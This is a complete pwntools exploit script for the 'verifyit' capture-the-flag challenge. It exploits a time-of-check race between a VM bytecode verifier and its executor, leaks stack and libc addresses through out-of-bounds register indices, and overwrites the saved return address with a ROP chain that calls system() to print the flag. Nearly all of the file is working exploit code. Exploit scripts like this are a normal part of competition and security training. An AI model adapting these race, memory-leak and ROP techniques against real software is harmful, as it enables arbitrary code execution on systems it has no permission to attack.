#!/usr/bin/env python3

from pwn import *
import re 
import time
e = ELF("./verifyit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]


context.log_level = "info"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc verify.challs.wicc2026eu.cybersecnatlab.it 38200"	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *execute
"""

if args.GDB:
	r = gdb.debug(e.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
	r = process(e.path)
elif args.DOCKER:
	r = remote("localhost", DOCKER_PORT)
else:
	r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)



"""
op format: op a b idx imm

verify:
    for op 0 and 1 doesn't validate the registers 
    executor uses the regs as idx on the stack array
    
load writes the vm program in shmem -> run does fork()
child calls verify, then execute 
but parent can do another load while child is between verify and execute
and overwrite shared memory

regs @ rbp - 0xd0

offsets from regs:
canary: rbp - 0x8 -> (rbp - 0x8) - (rbp - 0xd0) / 8 = 0xc8 / 8 = 25
rbp: 0xd0 / 8 = 26
saved rip: rbp + 0x8 = 0xd9 / 8 = 27
ret addr @ 27!

"""

POP_RDI = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
RET     = ROP(libc).find_gadget(["ret"])[0]
SYSTEM  = libc.sym["system"]
EXIT    = libc.sym["exit"]

LIBC_RET = 0x2a1ca

MASK = (1 << 64) - 1

# execute -> child_main+0x6b
EXEC_RET = e.sym["child_main"] + 0x6b

CMD_IDX = 70
FD = 4

def load(program):
	out = b"load\n"
	out += bstr(len(program)) + b"\n"
	for i in program:
		i = i.encode()
		out += i + b"\n"
	return out


def padding(program):
	return program + ["8 0 0 0 0"] * (128 - len(program))


def race(program, delay=0.03):
	data  = load(["7 0 0 0 0"] * 128) # load slow program which prints all regs
	data += b"run\n"
	data += load(padding(program))

	sn(data)

	if delay:
		time.sleep(delay)

	sl(b"result")
	return r.recvrepeat(0.5)


def leak_program(stack_idx, k):
	program = ["7 0 0 0 0"] * k

	# op1: mem[0] = regs[stack_idx]
	# op0: regs[0] = mem[0]
	# op6: print regs[0]
	program += [
		f"1 0 {stack_idx} 0 0",
		"0 0 0 0 0",
		"6 0 0 0 0",
		"8 0 0 0 0",
	]

	return padding(program)


def leak_idx(stack_idx, pred):
	while True:
		k = random.randint(8, 120)

		out = race(leak_program(stack_idx, k),0.02)

		vals = []
		for x in re.findall(r"r0 = (-?\d+)", out.decode()):
			vals.append(int(x) & MASK)

		for v in reversed(vals):
			if pred(v):
				return v

def write_stack(stack_idx, value):
	# regs[0] = value
	# mem[0] = regs[0]
	# regs[stack_idx] = mem[0]

	# uint64_t -> int64_t
	value &= MASK
	if value >= (1 << 63):
		value -= (1 << 64)
	
	return [
		f"5 0 0 0 {value}",
		"1 0 0 0 0",
		f"0 {stack_idx} 0 0 0",
	]


def gen_payload(rbp, k, align=False, reps=1):
	regs_addr = rbp - 0xd0
	cmd_addr = regs_addr + CMD_IDX * 8

	cmd = f"cat flag* >&{FD}\x00".encode()

	chain = [
		libc.address + POP_RDI,
		cmd_addr,
		libc.sym['system'],
		libc.sym['exit'],
	]

	# realign stack if not aligned
	if align:
		chain = [libc.address + RET] + chain

	writes = []

	for i, val in enumerate(chain):
		idx = 27 + i
		if idx != 27:
			writes.append((idx, val))

	for off in range(0, len(cmd), 8):
		writes.append((CMD_IDX + off // 8, u64((cmd[off:off + 8]).ljust(8, b"\x00"))))

	writes.append((27, chain[0]))

	program = ["7 0 0 0 0"] * k

	for _ in range(reps):
		for idx, val in writes:
			program += write_stack(idx, val)

	program += ["8 0 0 0 0"]

	return padding(program), cmd_addr


def solve(rbp):
	tries = []

	# try every combination of rop chain repeated, padding and different alignments
	for rop_num in [3, 2, 1]:
		for align in [True, False]:
			for pad_num in range(8,64):
				try:
					program, cmd_addr = gen_payload(rbp, pad_num, align=align, reps=rop_num)
					tries.append((program, cmd_addr, pad_num, align, rop_num))
				except ValueError:
					pass

	for _, (program, cmd_addr, pad_num, align, rop_num) in enumerate(tries):
		out = race(program, 0.05)

		if out:
			print(out.decode(), end="")

		if b"flag" in out:
			log.success("got flag")
			return

	r.interactive()

def main():
	r.recvrepeat(0.5)

	rbp = leak_idx(
		26,
		lambda x: (x >> 40) in range(0x70, 0x80) # if starts with [0x70, x80]
	)

	vleak("child rbp", rbp)

	ret = leak_idx(
		27,
		lambda x: (x & 0xfff) == (EXEC_RET & 0xfff)
	)

	vleak("execute ret", ret)

	libc_ret = leak_idx(
		45,
		lambda x: ((x >> 40) in range(0x70, 0x80)) and ((x & 0xfff) == (LIBC_RET & 0xfff)) # if starts with [0x70, x80] and the offset is correct
	)

	vleak("libc ret", libc_ret)

	exec_rbp = rbp - 0x20
	e.address = ret - EXEC_RET
	libc.address = libc_ret - LIBC_RET


	aleak("bin base", e.address)
	aleak("libc", libc.address)
	vleak("execute rbp", exec_rbp)

	solve(exec_rbp)
	r.interactive()


if __name__ == "__main__":
	main()